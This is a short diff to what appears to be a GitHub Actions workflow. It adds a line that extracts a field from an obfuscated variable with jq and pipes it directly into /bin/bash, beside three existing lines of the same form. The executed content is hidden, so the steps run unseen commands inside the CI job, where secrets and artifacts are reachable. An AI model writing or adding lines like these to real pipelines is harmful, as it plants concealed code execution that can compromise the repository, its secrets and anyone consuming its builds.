@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$afqus100" | jq -r .bibt35 | /bin/bash
           echo $dc3 | jq -r .gh25478 | /bin/bash
           printf '%s' "$h481" | jq -r .s4223 | /bin/bash
+          echo $bgptk445 | jq -r .wtlo80 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
